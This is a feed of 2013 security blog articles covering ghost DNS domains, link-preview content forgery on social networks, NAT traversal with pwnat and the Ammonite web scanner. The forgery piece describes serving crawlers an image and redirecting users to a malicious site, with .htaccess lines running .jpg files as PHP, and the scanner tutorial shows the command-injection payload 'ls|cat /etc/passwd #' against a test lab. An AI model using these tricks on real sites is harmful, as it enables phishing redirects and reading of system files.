&lt;p&gt;In this article we discussed a vulnerability recently discussed in a &lt;a href=&quot;https://www.isc.org/files/imce/ghostdomain_camera.pdf&quot;&gt;paper&lt;/a&gt; which signifies how it is possible to illegally update the cache of a DNS server and renew its TTL value for the delegation data of a particular domain. This would mean that the domain will still be resolvable even though it has been removed from the TLD. We then discussed some of the possible methods through which it is possible to determine if a particular domain is a Ghost domain or not.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Ghost Domain Names: Revoked Yet Still Resolvable&lt;br /&gt;
&lt;a href=&quot;https://www.isc.org/files/imce/ghostdomain_camera.pdf&quot;&gt;https://www.isc.org/files/imce/ghostdomain_camera.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;DNS Hacking (Beginner to Advanced)&lt;br /&gt;
&lt;a href=&quot;http://resources.infosecinstitute.com/dns-hacking/&quot;&gt;http://resources.infosecinstitute.com/dns-hacking/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Abusing Social Networking Sites to Perform Content Forgery</title>
   <link href="https://bitbrain.github.io/2013/06/13/abusing-social-networking-sites-to-perform-content-forgery.html"/>
   <updated>2013-06-13T22:38:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/abusing-social-networking-sites-to-perform-content-forgery</id>
   <content type="html">&lt;p&gt;Web Application vulnerabilities in social networking sites is very common these days. In this article we will be discussing a vulnerability found in Social networking sites because of which it is possible to spoof the content shown to the user. Basically whenever someone wants to share, post or send a link on Facebook or some other social networking site, a request goes through from their servers to the link which the user wants to share. This happens because Facebook (or that particular social networking site) wants to display a quick snapshot of what appears in the link to the user. However, these requests by social networking sites are easily identifiable because of the user-agent field in the headers of the incoming requests to the server or through their source IP address that resolves to a particular domain name. Hence it is possible for a malicious person to differentiate between the requests coming from the social networking sites and those coming from the users. The attacker can then display a simple image when the request is coming from Facebook so that on Facebook the snapshot appears to be that of a simple image. However when the user clicks on the link on Facebook, the attacker can know that the request is from the user by checking the user-agent field and redirect him to a malicious website.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;that-easily-identifiable-request&quot;&gt;That Easily Identifiable Request&lt;/h2&gt;

&lt;p&gt;Let’s say i want to share a link http://google.com on my Timeline. Whenever i type the link, Facebook automatically identifies it as a url and sends a request to http://google.com. This is because it wants to display a quick snapshot of what actually appears to be in the link. As we can see from the image below, Facebook has displayed a quick snapshot of how http://google.com appears like today.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/content-forgery/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These requests to the google.com server are easily identifiable because the user-agent of the incoming request is an indication of the social networking site being used or the IP address of the incoming request resolves to a particular domain name. For e.g Facebook uses a custom user-agent with the name “facebookexternalhit” and have their IP addresses resolve to tfbnw.net whereas Google+ uses a custom user-agent with the name “Feedfetcher-Google”.&lt;/p&gt;

&lt;p&gt;By using some custom php code like “$_SERVER[‘HTTP_USER_AGENT’]” to get the user-agent value and “gethostbyaddr($_SERVER[‘REMOTE_ADDR’])” to resolve the IP address we can easily identify whether the request is coming from a social networking site like Google+ or Facebook or just a regular user.&lt;/p&gt;

&lt;h2 id=&quot;implementation&quot;&gt;Implementation&lt;/h2&gt;

&lt;p&gt;One of the most important things in order to implement this is to have a domain and an access to a publicly reachable server. We will have a .jpg on our server which will have the php code to identify the user-agent or IP address and display the response accordingly. However in order for the php code to be run in the jpg file, the jpg file must be interpreted as a php file by the server. The following two lines when added in the .htaccess file will serve our purpose. The code has been taken from http://www.blackhatacademy.org/security101/Facebook&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php AddType x-httpd-php .jpg AddHandler application/x-httpd-php .jpg&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The first line assures that any .jpg file will be interpreted as a php file whereas the second line assures that any file with the externsion .jpg will be treated as a php program.&lt;/p&gt;

&lt;p&gt;Once this is done, we need to have the php code in our .jpg file on the server. The following lines of code demonstrate the exploit code for Facebook, Google+ and Websense. The code has been taken from &lt;a href=&quot;http://www.blackhatacademy.org/security101/Facebook&quot;&gt;http://www.blackhatacademy.org/security101/Facebook&lt;/a&gt; with the comments and the code a bit modified.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The code is pretty simple to understand. We check the user-agent, and the IP address of the incoming request. If the user-agent is identified as that of either Facebook, Google Plus or Websense then we know that this could be a request to take a snapshot of the url. Hence we display an image present on our server. Note that we also need to modify the Content-Type of the response to make it appear as an image. Hence on the social networking site, say Facebook, the snapshot of the url appears to be an image. However when the user clicks on the url, this time the user-agent is not of Facebook, Google+ or Websense rather it is the user-agent of the user itself. The php code identifies this as a regular user and redirects him to his malicious website (in this case evilsite.com).&lt;/p&gt;

&lt;p&gt;Similarly the POC code for Reddit is demonstrated below. This code has been taken from &lt;a href=&quot;http://www.chokepoint.net/?id=5&quot;&gt;http://www.chokepoint.net/?id=5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Their is also a POC facebook application available at &lt;a href=&quot;http://www.chokepoint.net/?id=5&quot;&gt;http://www.chokepoint.net/?id=5&lt;/a&gt;. It allows us to input an image and a redirect URL. As you can see below, i have given the input image as the image of the Google Logo whereas the redirect url is http://youtube.com.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/content-forgery/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, click on Submit. You will see a like button, a send button as well as a Reddit this! button appear. You can now send this request to yourself to check this vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/content-forgery/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is how the sent message looks like. As you can see, the snapshot contains the image of the google URL.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/content-forgery/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, when we click on the url, we will be redirected to youtube.com. Try this yourself to see !&lt;/p&gt;

&lt;h2 id=&quot;protection-against-content-forgery&quot;&gt;Protection Against Content Forgery&lt;/h2&gt;

&lt;p&gt;One of the ways to prevent from Content Forgery is to spoof the user-agent field to look like it is coming from a normal user. Another method could be to spoof the user-agent field as the user-agent of the user itself (i.e the user who is sharing or posting the link).&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we looked at a vulnerability which is caused due to the fact that the request made by Social Networking sites are easilty identifiable. These requests can hence be filtered out from the actual requests by the users. We looked at how this allows us to spoof the content which is actually appearing on the site. This could be used to redirect the users to malicious web pages through these Social networking sites simply because the original snapshot of the url looks pretty simple and unharming.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Facebook-Security 101&lt;br /&gt;
&lt;a href=&quot;http://www.blackhatacademy.org/security101/Facebook&quot;&gt;http://www.blackhatacademy.org/security101/Facebook&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Facebook and Reddit Content Forgery&lt;br /&gt;
&lt;a href=&quot;http://www.chokepoint.net/?id=5&quot;&gt;http://www.chokepoint.net/?id=5&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XSCF&lt;br /&gt;
&lt;a href=&quot;http://www.blackhatacademy.org/security101/XSCF&quot;&gt;http://www.blackhatacademy.org/security101/XSCF&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Circumventing NAT using UDP hole punching</title>
   <link href="https://bitbrain.github.io/2013/06/13/circumventing-nat-using-udp-hole-punching.html"/>
   <updated>2013-06-13T22:35:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/circumventing-nat-using-udp-hole-punching</id>
   <content type="html">&lt;p&gt;A lot of the networks use NAT (Network Address Translation) these days. This allows the systems on the same network to have a single global IP address. This also assures enhanced security but at the same time adds complications specially while connecting to P2P (Peer to Peer) networks. This is because at the time of initiating a connection in a Peer to Peer network, it is not possible to determine which packet coming from the peer is intended for which host on the network simply because they have one global IP address. Also, most of the networks with NAT may drop incoming packets simply because it cannot figure out which client on the NAT the packet is directed to, or may recognize it as an unauthorized packet etc. Some of the common Peer to Peer applications are Skype, Spotify etc.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;UDP hole punching is one of the most common techniques used to establish UDP connections with systems behind NAT. It is called UDP hole punching because it punches a hole in the firewall of the network which allows a packet from an outside system to successfully reach the desired client on a network using NAT. Though this process needs a third party host to establish connection between the clients, previous research has shown that this can be done without using third party hosts too.&lt;/p&gt;

&lt;h2 id=&quot;problems-while-performing-udp-hole-punching&quot;&gt;Problems while performing UDP Hole punching&lt;/h2&gt;

&lt;p&gt;UDP Hole punching is a technique via which it is possible to traverse NAT’s and establish P2P connections. This requires the use of a third party host. It is important to first discuss the problems which arise while performing UDP hole punching. Let’s assume the two systems who want to communicate with each other are A and B and the third system which helps them in establishing a connection is C.&lt;/p&gt;

&lt;p&gt;1) In order to establish connection between 2 systems, the systems should know each other’s global IP address and the port to which it wants to establish the connection . However when A sends an outbound packet, then it is possible that while traversing the NAT, the NAT changes the port number of A (often called port randomization). This makes UDP Hole punching almost impossible. The IP address is also rewritten to resemble the IP address of the NAT.&lt;/p&gt;

&lt;p&gt;2)The firewall at the NAT may not allow inbound connections from outside.&lt;/p&gt;

&lt;p&gt;3)Both the systems A and B must know the IP address of the third party server C.&lt;/p&gt;

&lt;h2 id=&quot;a-small-experiment&quot;&gt;A Small experiment&lt;/h2&gt;

&lt;p&gt;First let’s do a small experiment. Make sure your system is behind a NAT. Then go to the terminal and do a ping on any website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open up Wireshark to see the packets flowing through as shown in the figure below. We will see responses coming from the destination. But since our system is behind a NAT, how does the incoming packet know that the response is directed to us ? Well, the answer is simple. When our first packet went out of the network, NAT A noticed it and realized that some sort of communication was being established. Hence it decided that any sort of response which corresponds to this outgoing request will be forwarded to the system A. It then sees that the response had the content of the initial outgoing request and realized that it was meant for A, and hence forwarded the packet to A. What this did was that it basically punched a hole in the firewall, through which the firewall now allows incoming response which correspond to the request from A.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-udp-hole-punching-works&quot;&gt;How UDP Hole punching works.&lt;/h2&gt;

&lt;p&gt;We now have sufficient background to understand how UDP hole punching actually works. The process works in the following way. We assume that both the systems A and B know the IP address of C.&lt;/p&gt;

&lt;p&gt;a) Both A and B send UDP packets to the host C. As the packets pass through their NAT’s, the NAT’s rewrite the source IP address to its globally reachable IP address. It may also rewrite the source port number in which case UDP hole punching would be almost impossible.&lt;/p&gt;

&lt;p&gt;b) C notes the IP address and port of the incoming requests from A and B. Let the port number for A is X and the port number for B is Y.&lt;/p&gt;

&lt;p&gt;c) C then tells A to send UDP packet to the global IP address of the NAT for B at port Y, and similarly tells B to send UDP packet to the global IP address of the NAT for A at port X.&lt;/p&gt;

&lt;p&gt;d) The first packets for both A and B get rejected while entering into each other’s NAT’s. However as the packet passes from the NAT of A to the NAT of B at port number Y, the NAT A makes note of it and hence punches a hole in its firewall to allow incoming packets from the IP address of the NAT of B from port number Y. The same happens with the NAT of B and it makes a rule to allow incoming packets from the IP address of the NAT of A from port number X.&lt;/p&gt;

&lt;p&gt;e) Now when A and B send packets to each other, these get accepted and hence a P2P connection is established.&lt;/p&gt;

&lt;p&gt;From a penetration tester’s point of view, it is important to deduce some strategy to communicate with the victim behind the NAT.Based on the different scenarios, there can be 4 possible cases, we will assume the attacker to be the client and the victim to be the server we are trying to communicate with&lt;/p&gt;

&lt;p&gt;Case 1: The victim and the client are both behind seperate NAT’s.&lt;/p&gt;

&lt;p&gt;Case 2: The victim and the client are both behind same NAT’s.&lt;/p&gt;

&lt;p&gt;Case 3: The victim is behind a NAT whereas the client isn’t and has a global IP address.&lt;/p&gt;

&lt;p&gt;Case 4: The client is behind a NAT whereas the victim isn’t and has a global IP address.&lt;/p&gt;

&lt;p&gt;The UDP hole punching technique discussed above will work on almost all those cases. I am using the word almost because UDP hole punching does not work on all the NAT implementations, simply because their is no standard procedure in which a particular NAT operates. In the cases where it doesn’t work, the third party host is used to relay the whole traffic between A and B.&lt;/p&gt;

&lt;h2 id=&quot;how-skype-does-it&quot;&gt;How Skype Does it&lt;/h2&gt;

&lt;p&gt;Skype uses the UDP hole punching technique to allow communication between users who are behind NAT. However, Skype does not use a separate server to act as a third party host. Rather it uses its users computers to act as a third party host. Any client which has a publicly reachable IP can become the third party host. Hence this may increase the load on Skype’s users as they are responsible for initiating connection between the users who are behind NAT. Sometimes UDP hole punching may not be possible due to various reasons like port randomization by the NAT etc. In the cases where UDP hole punching is not possible, the third party host (i.e a Skype user’s system having a globally reachable IP address) is used to relay the whole communication between the users who are behind NAT.&lt;/p&gt;

&lt;h2 id=&quot;p2p-communication-without-a-third-party-host&quot;&gt;P2P communication without a Third party host&lt;/h2&gt;

&lt;p&gt;Some of the problems with UDP hole punching is that a third party server is always required to relay traffic or to establish UDP states between the machines. This increases the load on the third party server. There has been research to determine whether it is possible to establish P2P connection between systems without a third party host. Researchers Andreas Muller, Nathan Evans, Christian Grothoff and Samy Kamkar have discussed some theoretical methods in their paper “Autonomous NAT Traversal” which could help in achieving this goal. Their approach uses fake replies to establish connection between peers. As always, we have the 4 cases.&lt;/p&gt;

&lt;p&gt;Case 1: The victim and the client are both behind seperate NAT’s.&lt;/p&gt;

&lt;p&gt;Case 2: The victim and the client are both behind same NAT’s.&lt;/p&gt;

&lt;p&gt;Case 3: The victim is behind a NAT whereas the client isn’t and has a global IP address.&lt;/p&gt;

&lt;p&gt;Case 4: The client is behind a NAT whereas the victim isn’t and has a global IP address.&lt;/p&gt;

&lt;p&gt;According to their paper, the technique proposed by them works quite well for the cases 3 and 4 but doesn’t work quite well for the cases 1 and 2. A proof of concept tool named “pwnat” was also released which is also available in Backtrack. We will discuss the techniques proposed by them now for cases 3 and 4 and also look at a demo. We assume that the server is behind a NAT whereas the client is trying to initiate a connection from a globally reachable IP address.&lt;/p&gt;

&lt;p&gt;a) Open up pwnat in Backtrack. We can see that it can be run in server as well as client mode. We will run both on our local machine just to understand how the communication happens.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;b) Type in the following command as shown below to start the server. 10.0.2.15 stands for the IP address of our local machine and 2222 is the port from which our packets will generate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;c) Now open up Wireshark and start sniffing packets. We notice that some ping requests are going to the non-existent IP address 3.3.3.3. Note that since the packets are being passed from the NAT, the NAT will allow incoming packets from random IP address which appear to be a response for this request. Note that i am saying random IP address because the response could be from a hop on the way to the destination 3.3.3.3 (which is non-existent) and if it can prove to the NAT that it was a response for the initial request, then it will be allowed into the network and directed to our local machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;d) Now we will start the client. Type in the following command as shown in the figure below to start the pwnat client. 8000 is the port on the client from where we want the connection to be initiated. localhost 80 is the host and port to which we want to be redirected to through the communication channel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the server side, we can see that it has got a connection request and is regularly receiving packets from the client. This confirms that a communication channel has been established. The packets that the server is regularly receiving are the keep alive packets sent by the client in order to maintain the connection state.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we look at the wireshark trace, we can see “TTL exceeded” packets being sent to the server. If we look at the content of one of the packets, we can see that the content contains the original request packet. This packet is actually a fake reply to the server indicating that the TTL has expired for the ping request to 3.3.3.3. This packet is actually sent by the client and when it reaches the NAT of A, the NAT recognizes it as a response to the initial ping request to 3.3.3.3 sent by A and hence routes it to A. Once the packet reaches A, A figures out the IP address and port of the client and hence a bidirectional communication channel can now be established.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/nat-traversal/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In cases where both the systems are behind NAT, the payload of the reply from the client to the server could contain the IP address of the client as well as the port number on which it wants to initiate the connection. One of the other issues with this could be that the fake ICMP replies sent by the client could be rejected by the client’s NAT. Hence this many not work in all cases. The pwnat tool though has support for communicating between NAT to NAT peers.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;P2P applications are very popular these days mainly because they don’t require use of third party servers to relay traffic between them. However this makes it tough for systems behind NAT’s to establish P2P networks between them. From a penetration tester’s point of view also, it is important to establish a direct communication channel with a victim which is behind a NAT. In this article we discussed some of the techniques like UDP hole punching which use third party hosts to establish communication states between the client. Once the communication state has been established, these client can establish a bi-directional communication channel between each other. We also looked at some of the techniques of establishing a communication between two systems behind NAT without the use of third-party hosts and looked at some of the scenarios in which they could be used.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Autonomous NAT Traversal&lt;br /&gt;
&lt;a href=&quot;http://grothoff.org/christian/pwnat.pdf&quot;&gt;grothoff.org/christian/pwnat.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;UDP hole punching&lt;br /&gt;
&lt;a href=&quot;http://en.wikipedia.org/wiki/UDP_hole_punching&quot;&gt;http://en.wikipedia.org/wiki/UDP_hole_punching&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Scanning the web with Ammonite</title>
   <link href="https://bitbrain.github.io/2013/06/13/scanning-the-web-with-ammonite.html"/>
   <updated>2013-06-13T22:09:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/scanning-the-web-with-ammonite</id>
   <content type="html">&lt;p&gt;Ammonite is a Fiddler extension used to scan web application for common vulnerabilities like verbose and blind SQL injection, OS commanding, local file inclusion, buffer overflows, format string vulnerabilities etc. Ammonite can also scan responses for important information like credit card numbers. Some of the unique features of Ammonite is its ability to test all sections of an HTTP Request for which includes headers (ever heard of SQL injection through HTTP headers ? ), cookies etc. One of the other features which is particularly interesting about Ammonite is the ability to pause, cancel and resume individual test cases. This is different than the conventional web scanners where the tests are executed in a particular order and we can just wait and watch if some test is taking a long time. Ammonite also has features for exporting requests in Python which aids in exploit development. We can also generate our own customised HTML report.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Please note that Ammonite is not a web exploitation tool. It is a lightweight web application scanner which is extremely fast and reliable. In this article, we will be looking at all the features of Ammonite through demonstrations.&lt;/p&gt;

&lt;h2 id=&quot;fiddler&quot;&gt;Fiddler&lt;/h2&gt;

&lt;p&gt;Since Ammonite is an extension of Fiddler, it is important that you have a little bit of experience with Fiddler. Fiddler is a Web Debugging Proxy which allows us to inspect traffic for both HTTP and HTTPS. We can tamper data by setting our own custom rules or use breakpoints to observe and fiddle with specific requests and responses. If you have little or no experience will Fiddler, you can start by watching some introductory videos for Fiddler &lt;a href=&quot;http://www.fiddler2.com/Fiddler/help/video/default.asp&quot;&gt;here&lt;/a&gt;. The figure below shows a screenshot of Fiddler in Action.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;setting-up-ammonite&quot;&gt;Setting up Ammonite&lt;/h2&gt;

&lt;p&gt;Ammonite can be bought from &lt;a href=&quot;http://ammonite.ryscc.com/buy.html&quot;&gt;here&lt;/a&gt;. There is also a 30 day free Trial version available. The first and foremost thing for Ammonite to work is to have Fiddler set up on your computer. Once this is done, open up the Ammonite setup file and follow along the instructions. In between it will also ask for the license file. You can get the license file from the Ammonite installation directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it is installed, restart Fiddler for the changes to take effect. You will see two new tabs named “Testing” and “Results” being added to Fiddler as shown in the figure below. This means Ammonite is now set up for use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;first-look&quot;&gt;First Look&lt;/h2&gt;

&lt;p&gt;Let’s have a look at all the options that Ammonite provides us with. As you can see from the figure below, we have an option to choose from a various number of vulnerabilities like SQL Injection, Local File inclusion, Cross-Site Scripting etc. We can also perform passive checks to gather confidential information like credit card numbers etc. We also have the power to inject into all the different sections of an HTTP Request like headers, cookies etc which makes a lot of the advanced attacks (for e.g SQL injection through HTTP cookies) possible. We can also choose between Manual and Automatic mode. In Manual mode, you have to manually choose a web session and perform a vulnerability scan on it. In the automatic case, we have to specify the URL patterns that will be tested. We can also save the requests and responses to a file. We can set limits on the request timeout, change the number of requests per second, specify a limit on the maximum number of retries, and can also set the number of threads. We can skip testing with identical requests so that we can save time, stop testing on the first vulnerable parameter and can also skip automatic testing of media responses which include images, videos etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;test-enviroment&quot;&gt;Test Enviroment&lt;/h2&gt;

&lt;p&gt;In order to run the tool and see the results, we need a vulnerable test environment to perform all the scans on. In this case we will be using the “w3af test enviroment” to perform the scans on. w3af test environment is available on the Security Distro &lt;em&gt;Web Security Dojo&lt;/em&gt; which can be downloaded from &lt;a href=&quot;http://sourceforge.net/projects/websecuritydojo/files/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;manual-testing&quot;&gt;Manual Testing&lt;/h2&gt;

&lt;h4 id=&quot;1testing-for-os-commanding&quot;&gt;1)Testing for OS Commanding&lt;/h4&gt;

&lt;p&gt;-We will now be testing for OS commanding vulnerabilities in the test environment. To test it using Ammonite, simply browse to the vulnerable url. The url will appear on the left hand side under the Web Sessions section in Fiddler.&lt;img src=&quot;/images/posts/ammonite/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, make sure Ammonite is configured according to our requirements. As it is clear from the figure below, i am only testing the url for some specific vulnerabilities like OS and blind command injection. Also, i have checked the &lt;em&gt;Skip media responses&lt;/em&gt; and the &lt;em&gt;Skip identical requests&lt;/em&gt; option. &lt;img src=&quot;/images/posts/ammonite/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you can just right click on the appropriate Web Session in Fiddler and go to Ammonite –&amp;gt; Test to start testing the session for vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the test has run, you can see the Status down in the Running tests section. As it is clear from the figure below, Ammonite obtained 1 vulnerability with Risk Level &lt;em&gt;High&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Go to the results tab to get a better idea of the vulnerability. As we can see from the figure below, Ammonite has given a clear description of the vulnerability along with the Remedy and the Reproduction steps. Another important thing to note is the information in the parameter section. The text under the parameter section reads _cmd: Original=ls Modified=ls&lt;/td&gt;
      &lt;td&gt;cat /etc/passwd #_ . The thing below colon specifies the vulnerable parameter which in this case is &lt;em&gt;cmd&lt;/em&gt;. The original parameter (in this case &lt;em&gt;ls&lt;/em&gt;) is the one sent in the original request whereas the modified parameter (in this case _ls&lt;/td&gt;
      &lt;td&gt;cat /etc/passwd #_ ) is the one which actually led to identification of the vulnerability. This provides valuable information about what goes on under the hood.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you are interested in learning more about the vulnerability, it is a good thing to look at the request and the response that led to its identification. We can see the vulnerable parameter being passed over as is clear from the Headers tab of the request. Fiddler allows us to see the request in may different forms and also see other information like the cookies, auth parameters as is clear from the different tabs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the response section, it is clear that the output corresponding to the input parameter (the os command) was found. Again, we can view the response in many different forms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;2testing-for-blind-os-commanding&quot;&gt;2)Testing for Blind OS commanding&lt;/h4&gt;

&lt;p&gt;-Ammonite can also detect blind OS commanding vulnerabilities. In case of blind OS commanding in which the response is not echoed in the output, Ammonite uses time delays to identify if a OS commanding vulnerability is present. For e.g if it sends a command which delays the response for some seconds, and if it notes a delay in the output, we can say that a blind OS commanding vulnerability is present. To test the session, simply right click on the web session and click on Ammonite–&amp;gt;Test&lt;img src=&quot;/images/posts/ammonite/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability is identified by Ammonite as shown in the figure below. From the parameters shown for identifying the vulnerability, we can see that a delay of 5 seconds (sleep 5) was sent.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;3testing-for-local-file-inclusion&quot;&gt;3)Testing for Local File Inclusion&lt;/h4&gt;

&lt;p&gt;-In this case, we are testing a Local File Inclusion vulnerability using Ammonite. We can just browse to the vulnerable url on the &lt;em&gt;w3af test environment&lt;/em&gt;. Fiddler recognizes the session and now we can test it using Ammonite. The figure below shows that Ammonite identified the LFI vulnerability. We can see more info from the parameter information or from the Request/Response tabs.&lt;img src=&quot;/images/posts/ammonite/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the figure below, we can also see that Ammonite was able to make some Content discovery. Let’s have a closer look at what it found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ammonite/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see from the details below, Ammonite was able to find some other content while performing the tests. By looking at the parameter section, it is clear that when Ammonite entered the parameter &lt;em&gt;REST4&lt;/em&gt; as &lt;em&gt;includes&lt;/em&gt;, it found some content on the url which was created. It recognized this as an information leakage issue and reported it to us. Getting extra information like this could be valuable in a web application vulnerability scan. It also increases the attack surface of the web application.&lt;/p&gt;

&lt;h4 id=&quot;4testing-for-cross-site-scripting&quot;&gt;4)Testing for Cross Site Scripting&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Let’s perform a test for Cross Site Scripting. We follow the same process again and perform a XSS check on the vulnerable url in the &lt;em&gt;w3af test environment&lt;/em&gt;. As we can see, the vulnerability was identified as shown in the figure below.&lt;img src=&quot;/images/posts/ammonite/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

